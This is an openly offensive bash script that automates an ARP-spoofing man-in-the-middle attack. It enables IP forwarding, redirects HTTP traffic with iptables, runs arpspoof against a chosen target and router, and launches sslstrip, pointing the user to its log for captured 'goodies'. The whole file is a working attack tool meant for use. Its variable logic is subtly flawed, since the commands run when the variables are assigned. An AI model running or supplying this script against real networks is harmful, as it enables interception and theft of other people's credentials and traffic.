#!/bin/bash
#ssl strip
#####Variables#####
var_forward=`cat /proc/sys/net/ipv4/ip_forward`
var_setforward=`echo "1" > /proc/sys/net/ipv4/ip_forward`
var_iptables=`iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080`

if [ $var_forward -eq "1" ]
then 
	$var_iptables
	echo "iptables set"
else
	$var_setforward
	echo " IP port Forwarding set to '1' "
	$var_iptables
	echo "iptables now set"
fi
#####ARPSPOOF#####
echo -n "Input Target IP:"
read targetip
if  [[ $targetip == '' ]] ;  then
targetip=192.168.2.2 #Default ip is 192.168.2.2#
fi

echo -n "Input Router IP:"
read routerip
if  [[ $routerip == '' ]] ;  then
routerip=192.168.2.1 #Default router IP is 192.168.2.1#
fi

echo -n "Input interface:"
read interface
if  [[ $interface == '' ]] ;  then
interface=wlan0 #Default interface is wlan0#
fi


xterm -bg black -fg green -geometry 75x8+0+500 -e arpspoof -i $interface -t $targetip $routerip &

########sslstrip#####

xterm -bg black -fg green -geometry 75x8+0-31 -e /pentest/web/sslstrip/./sslstrip.py -l 8080 &
echo "sslstrip is running"

####sslstrip log #####

xterm -bg black -fg green -geometry 75x8+0+400 -e tail -f /pentest/web/sslstrip/sslstrip.log &
echo "Check sslstrip.log for your goodies!"
